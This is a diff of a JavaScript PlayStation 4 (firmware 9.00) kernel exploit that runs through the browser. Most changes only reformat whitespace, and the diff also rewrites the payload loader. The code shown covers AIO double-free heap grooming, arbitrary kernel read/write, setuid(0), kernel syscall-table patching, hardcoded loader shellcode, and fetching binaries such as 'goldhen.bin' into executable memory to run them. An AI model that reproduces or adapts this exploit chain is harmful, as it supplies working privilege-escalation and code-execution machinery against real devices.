@@ -140,9 +140,9 @@ const num_leaks = 5;
 const num_clobbers = 8;
 
 //Payload_Loader
-const PROT_READ = 1;
-const PROT_WRITE = 2;
-const PROT_EXEC = 4;
+ const PROT_READ = 1;
+ const PROT_WRITE = 2;
+ const PROT_EXEC = 4;
 
 let chain = null;
 var nogc = [];
@@ -151,15 +151,15 @@ async function init() {
     await rop.init();
     chain = new Chain();
 
-    // PS4 9.00
-    const pthread_offsets = new Map(Object.entries({
-        'pthread_create': 0x25510,
-        'pthread_join': 0xafa0,
-        'pthread_barrier_init': 0x273d0,
-        'pthread_barrier_wait': 0xa320,
-        'pthread_barrier_destroy': 0xfea0,
-        'pthread_exit': 0x77a0,
-    }));
+// PS4 9.00
+const pthread_offsets = new Map(Object.entries({
+    'pthread_create' : 0x25510,
+    'pthread_join' : 0xafa0,
+    'pthread_barrier_init' : 0x273d0,
+    'pthread_barrier_wait' : 0xa320,
+    'pthread_barrier_destroy' : 0xfea0,
+    'pthread_exit' : 0x77a0,
+}));
 
     rop.init_gadget_map(rop.gadgets, pthread_offsets, rop.libkernel_base);
 }
@@ -238,7 +238,7 @@ const _aio_errors_p = _aio_errors.addr;
 //     u_int num_ids,
 //     int sce_errors[]
 // );
-function aio_multi_delete(ids, num_ids, sce_errs = _aio_errors_p) {
+function aio_multi_delete(ids, num_ids, sce_errs=_aio_errors_p) {
     sysi('aio_multi_delete', ids, num_ids, sce_errs);
 }
 
@@ -248,7 +248,7 @@ function aio_multi_delete(ids, num_ids, sce_errs = _aio_errors_p) {
 //     u_int num_ids,
 //     int states[]
 // );
-function aio_multi_poll(ids, num_ids, sce_errs = _aio_errors_p) {
+function aio_multi_poll(ids, num_ids, sce_errs=_aio_errors_p) {
     sysi('aio_multi_poll', ids, num_ids, sce_errs);
 }
 
@@ -258,7 +258,7 @@ function aio_multi_poll(ids, num_ids, sce_errs = _aio_errors_p) {
 //     u_int num_ids,
 //     int states[]
 // );
-function aio_multi_cancel(ids, num_ids, sce_errs = _aio_errors_p) {
+function aio_multi_cancel(ids, num_ids, sce_errs=_aio_errors_p) {
     sysi('aio_multi_cancel', ids, num_ids, sce_errs);
 }
 
@@ -277,7 +277,7 @@ function aio_multi_cancel(ids, num_ids, sce_errs = _aio_errors_p) {
 //     uint32_t mode,
 //     useconds_t *timeout
 // );
-function aio_multi_wait(ids, num_ids, sce_errs = _aio_errors_p) {
+function aio_multi_wait(ids, num_ids, sce_errs=_aio_errors_p) {
     sysi('aio_multi_wait', ids, num_ids, sce_errs, 1, 0);
 }
 
@@ -285,13 +285,13 @@ function make_reqs1(num_reqs) {
     const reqs1 = new Buffer(0x28 * num_reqs);
     for (let i = 0; i < num_reqs; i++) {
         // .fd = -1
-        reqs1.write32(0x20 + i * 0x28, -1);
+        reqs1.write32(0x20 + i*0x28, -1);
     }
     return reqs1;
 }
 
 function spray_aio(
-    loops = 1, reqs1_p, num_reqs, ids_p, multi = true, cmd = AIO_CMD_READ,
+    loops=1, reqs1_p, num_reqs, ids_p, multi=true, cmd=AIO_CMD_READ,
 ) {
     const step = 4 * (multi ? num_reqs : 1);
     cmd |= multi ? AIO_CMD_FLAG_MULTI : 0;
@@ -301,7 +301,7 @@ function spray_aio(
     }
 }
 
-function poll_aio(ids, states, num_ids = ids.length) {
+function poll_aio(ids, states, num_ids=ids.length) {
     if (states !== undefined) {
         states = states.addr;
     }
@@ -705,7 +705,7 @@ function double_free_reqs2(sds) {
         const sd_conn = sysi('accept', sd_listen, 0, 0);
         // force soclose() to sleep
         ssockopt(sd_client, SOL_SOCKET, SO_LINGER, View4.of(1, 1));
-        reqs1.write32(0x20 + which_req * 0x28, sd_client);
+        reqs1.write32(0x20 + which_req*0x28, sd_client);
 
         aio_submit_cmd(cmd, reqs1_p, num_reqs, aio_ids_p);
         aio_multi_cancel(aio_ids_p, num_reqs);
@@ -793,7 +793,7 @@ function verify_reqs2(buf, offset) {
             if (buf.read16(offset + i + 4) !== 0xffff) {
                 heap_prefixes.push(buf.read16(offset + i + 4));
             }
-            // offset 0x48 can be NULL
+        // offset 0x48 can be NULL
         } else if (i === 0x50 || !buf.read64(offset + i).eq(0)) {
             return false;
         }
@@ -1089,7 +1089,7 @@ function double_free_reqs1(
                 log(`states[${req_idx}]: ${hex(states[req_idx])}`);
                 log(`aliased at attempt: ${i}`);
 
-                const aio_idx = batch * num_elems + req_idx;
+                const aio_idx = batch*num_elems + req_idx;
                 req_id = new Word(aio_ids[aio_idx]);
                 log(`req_id: ${hex(req_id)}`);
                 aio_ids[aio_idx] = 0;
@@ -1256,7 +1256,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     log('\nmaking arbitrary kernel read/write');
     const cpuid = 7 - main_core;
     const off_cpuid_to_pcpu = 0x21ef2a0;
-    const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid * 8);
+    const pcpu_p = kbase.add(off_cpuid_to_pcpu + cpuid*8);
     log(`cpuid_to_pcpu[${cpuid}]: ${pcpu_p}`);
     const pcpu = kread64(pcpu_p);
     log(`pcpu: ${pcpu}`);
@@ -1465,14 +1465,14 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     log('achieved arbitrary kernel read/write');
 
     // RESTORE: clean corrupt pointer
-    // pktopts.ip6po_rthdr = NULL
-    //ABC Patch
-    const off_ip6po_rthdr = 0x68;
-    const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
-    const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-    kmem.write64(r_rthdr_p, 0);
-    kmem.write64(w_rthdr_p, 0);
-    log('corrupt pointers cleaned');
+     // pktopts.ip6po_rthdr = NULL
+     //ABC Patch
+     const off_ip6po_rthdr = 0x68;
+     const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
+     const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
+     kmem.write64(r_rthdr_p, 0);
+     kmem.write64(w_rthdr_p, 0);
+     log('corrupt pointers cleaned');
 
     /*
     // REMOVE once restore kernel is ready for production
@@ -1481,7 +1481,7 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
     kmem.write32(worker_sock, kmem.read32(worker_sock) + 1);
     // +2 since we have to take into account the fget_write()'s reference
     kmem.write32(pipe_file.add(0x28), kmem.read32(pipe_file.add(0x28)) + 2);*/
-
+    
     return [kbase, kmem, p_ucred, [kpipe, pipe_save, pktinfo_p, w_pktinfo]];
 }
 
@@ -1539,7 +1539,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     if (map_size === 0) {
         die('patch file size is zero');
     }
-    map_size = map_size + page_size & -page_size;
+    map_size = map_size+page_size & -page_size;
 
     const prot_rwx = 7;
     const prot_rx = 5;
@@ -1554,7 +1554,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         exec_p,
         map_size,
         prot_rx,
-        MAP_SHARED | MAP_FIXED,
+        MAP_SHARED|MAP_FIXED,
         exec_fd,
         0,
     );
@@ -1563,7 +1563,7 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
         write_p,
         map_size,
         prot_rw,
-        MAP_SHARED | MAP_FIXED,
+        MAP_SHARED|MAP_FIXED,
         write_fd,
         0,
     );
@@ -1608,9 +1608,9 @@ async function patch_kernel(kbase, kmem, p_ucred, restore_info) {
     kmem.write64(sysent_661.add(8), sy_call);
     // .sy_thrcnt = SY_THR_STATIC
     kmem.write32(sysent_661.add(0x2c), sy_thrcnt);
-    localStorage.ExploitLoaded = "yes"
-    sessionStorage.ExploitLoaded = "yes";
-    //alert("kernel exploit succeeded!");
+    localStorage.ExploitLoaded="yes"
+    sessionStorage.ExploitLoaded="yes";
+   //alert("kernel exploit succeeded!");
 }
 
 
@@ -1627,8 +1627,8 @@ function setup(block_fd) {
     const block_id = new Word();
 
     for (let i = 0; i < num_workers; i++) {
-        reqs1.write32(8 + i * 0x28, 1);
-        reqs1.write32(0x20 + i * 0x28, block_fd);
+        reqs1.write32(8 + i*0x28, 1);
+        reqs1.write32(0x20 + i*0x28, block_fd);
     }
     aio_submit_cmd(AIO_CMD_READ, reqs1.addr, num_workers, block_id.addr);
 
@@ -1640,7 +1640,7 @@ function setup(block_fd) {
     const greqs = make_reqs1(num_reqs);
     // allocate enough so that we start allocating from a newly created slab
     spray_aio(num_grooms, greqs.addr, num_reqs, groom_ids_p, false);
-    cancel_aios(groom_ids_p, num_grooms);
+    cancel_aios(groom_ids_p, num_grooms);        
     return [block_id, groom_ids];
 }
 
@@ -1648,15 +1648,15 @@ function runBinLoader() {
     var payload_buffer = chain.sysp('mmap', 0x0, 0x300000, 0x7, 0x1000, 0xFFFFFFFF, 0);
     var payload_loader = malloc32(0x1000);
     var BLDR = payload_loader.backing;
-    BLDR[0] = 0x56415741; BLDR[1] = 0x83485541; BLDR[2] = 0x894818EC;
-    BLDR[3] = 0xC748243C; BLDR[4] = 0x10082444; BLDR[5] = 0x483C2302;
-    BLDR[6] = 0x102444C7; BLDR[7] = 0x00000000; BLDR[8] = 0x000002BF;
-    BLDR[9] = 0x0001BE00; BLDR[10] = 0xD2310000; BLDR[11] = 0x00009CE8;
-    BLDR[12] = 0xC7894100; BLDR[13] = 0x8D48C789; BLDR[14] = 0xBA082474;
-    BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8; BLDR[17] = 0xFF894400;
-    BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800; BLDR[20] = 0x89440000;
-    BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2; BLDR[23] = 0x89410000;
-    BLDR[24] = 0x2C8B4CC6; BLDR[25] = 0x45C64124; BLDR[26] = 0x05EBC300;
+    BLDR[0]  = 0x56415741;  BLDR[1]  = 0x83485541;  BLDR[2]  = 0x894818EC;
+    BLDR[3]  = 0xC748243C;  BLDR[4]  = 0x10082444;  BLDR[5]  = 0x483C2302;
+    BLDR[6]  = 0x102444C7;  BLDR[7]  = 0x00000000;  BLDR[8]  = 0x000002BF;
+    BLDR[9]  = 0x0001BE00;  BLDR[10] = 0xD2310000;  BLDR[11] = 0x00009CE8;
+    BLDR[12] = 0xC7894100;  BLDR[13] = 0x8D48C789;  BLDR[14] = 0xBA082474;
+    BLDR[15] = 0x00000010; BLDR[16] = 0x000095E8;  BLDR[17] = 0xFF894400;
+    BLDR[18] = 0x000001BE; BLDR[19] = 0x0095E800;  BLDR[20] = 0x89440000;
+    BLDR[21] = 0x31F631FF; BLDR[22] = 0x0062E8D2;  BLDR[23] = 0x89410000;
+    BLDR[24] = 0x2C8B4CC6;  BLDR[25] = 0x45C64124;  BLDR[26] = 0x05EBC300;
     BLDR[27] = 0x01499848; BLDR[28] = 0xF78944C5; BLDR[29] = 0xBAEE894C;
     BLDR[30] = 0x00001000; BLDR[31] = 0x000025E8; BLDR[32] = 0x7FC08500;
     BLDR[33] = 0xFF8944E7; BLDR[34] = 0x000026E8; BLDR[35] = 0xF7894400;
@@ -1702,18 +1702,18 @@ export async function kexploit() {
     await init();
     const _init_t2 = performance.now();
 
-    try {
+     try {
         chain.sys('setuid', 0);
-    }
+        }
     catch (e) {
         localStorage.ExploitLoaded = "no";
     }
-
-    if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded != "yes") {
-        runBinLoader();
-        return new Promise(() => { });
-    }
-
+    
+     if (localStorage.ExploitLoaded === "yes" && sessionStorage.ExploitLoaded!="yes") {
+           runBinLoader();
+            return new Promise(() => {});
+      }
+ 
     // fun fact:
     // if the first thing you do since boot is run the web browser, WebKit can
     // use all the cores
@@ -1767,7 +1767,7 @@ export async function kexploit() {
 
         log('\nSTAGE: Patch kernel');
         await patch_kernel(kbase, kmem, p_ucred, restore_info);
-
+        
     } finally {
         close(unblock_fd);
 
@@ -1806,7 +1806,7 @@ function malloc32(sz) {
     return ptr;
 }
 function array_from_address(addr, size) {
-    var og_array = new Uint32Array(0x1000);
+   var og_array = new Uint32Array(0x1000);
     var og_array_i = mem.addrof(og_array).add(0x10);
     mem.write64(og_array_i, addr);
     mem.write32(og_array_i.add(0x8), size);
@@ -1815,84 +1815,58 @@ function array_from_address(addr, size) {
     return og_array;
 }
 
-function PayloadLoader(Pfile) {
-    return new Promise((resolve, reject) => {
-        var loader_addr = chain.sysp(
-            'mmap',
-            new Int(0, 0),
-            0x1000,
-            PROT_READ | PROT_WRITE | PROT_EXEC,
-            0x41000,
-            -1,
-            0
-        );
+function PayloadLoader(Pfile)
+{
+    var loader_addr = chain.sysp(
+  'mmap',
+  new Int(0, 0),                         
+  0x1000,                               
+  PROT_READ | PROT_WRITE | PROT_EXEC,    
+  0x41000,                              
+  -1,
+  0
+);
 
-        var tmpStubArray = array_from_address(loader_addr, 1);
-        tmpStubArray[0] = 0x00C3E7FF;
+ var tmpStubArray = array_from_address(loader_addr, 1);
+ tmpStubArray[0] = 0x00C3E7FF;
 
-        var req = new XMLHttpRequest();
-        req.responseType = "arraybuffer";
-        req.open('GET', Pfile);
-        req.send();
-        req.onreadystatechange = function () {
-            if (req.readyState == 4) {
-                if (req.status != 200 && req.status != 0) {
-                    log(`Failed to load ${Pfile}`);
-                    resolve(); // Resolve anyway to continue chain or reject? Better resolve to not hang.
-                    return;
-                }
-                var PLD = req.response;
-                var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+ var req = new XMLHttpRequest();
+ req.responseType = "arraybuffer";
+ req.open('GET',Pfile);
+ req.send();
+ req.onreadystatechange = function () {
+  if (req.readyState == 4) {
+   var PLD = req.response;
+   var payload_buffer = chain.sysp('mmap', 0, 0x300000, 7, 0x41000, -1, 0);
+   var pl = array_from_address(payload_buffer, PLD.byteLength*4);
+   var padding = new Uint8Array(4 - (req.response.byteLength % 4) % 4);
+   var tmp = new Uint8Array(req.response.byteLength + padding.byteLength);
+   tmp.set(new Uint8Array(req.response), 0);
+   tmp.set(padding, req.response.byteLength);
+   var shellcode = new Uint32Array(tmp.buffer);
+   pl.set(shellcode,0);
+   var pthread = malloc(0x10);
+   
+    call_nze(
+        'pthread_create',
+        pthread,
+        0,
+        loader_addr,
+        payload_buffer,
+    );	
+   }
+ };
 
-                // Create view for payload buffer with enough size
-                // Original used byteLength*4 which is safe but large. sticking to safe.
-                var pl = array_from_address(payload_buffer, PLD.byteLength * 4);
 
-                // Align to 4 bytes for Uint32Array
-                var paddingCount = (4 - (req.response.byteLength % 4)) % 4;
-                var tmp = new Uint8Array(req.response.byteLength + paddingCount);
-                tmp.set(new Uint8Array(req.response), 0);
-
-                var shellcode = new Uint32Array(tmp.buffer);
-                pl.set(shellcode, 0);
-
-                // FIXED: Use malloc32 instead of undefined malloc
-                var pthread = malloc32(0x10);
-
-                call_nze(
-                    'pthread_create',
-                    pthread,
-                    0,
-                    loader_addr,
-                    payload_buffer,
-                );
-
-                log(`${Pfile} launched`);
-                resolve();
-            }
-        };
-        req.onerror = () => {
-            log(`Error fetching ${Pfile}`);
-            resolve();
-        };
-    });
 }
 
-kexploit().then(async () => {
-    try {
-        log("Starting Payload Chain...");
+kexploit().then(() => {
 
-        // Load ABC fix as a regular Payload
-        await PayloadLoader("aio_patches.bin");
-        await sleep(500); // Small delay for stability
-        log("AIO Fixes Applied.!");
+//Load ABC fix as a regular Payload
+setTimeout(PayloadLoader("aio_patches.bin"),500);
+log("AIO Fixes Applied.!");
+//Load GoldHEN :)
+setTimeout(PayloadLoader("goldhen.bin"),500);
+log("GoldHEN Loaded.!");
 
-        // Load GoldHEN :)
-        log("Loading GoldHEN...");
-        await PayloadLoader("goldhen.bin");
-        log("GoldHEN Loaded.!");
-
-    } catch (e) {
-        log("Payload error: " + e);
-    }
 })
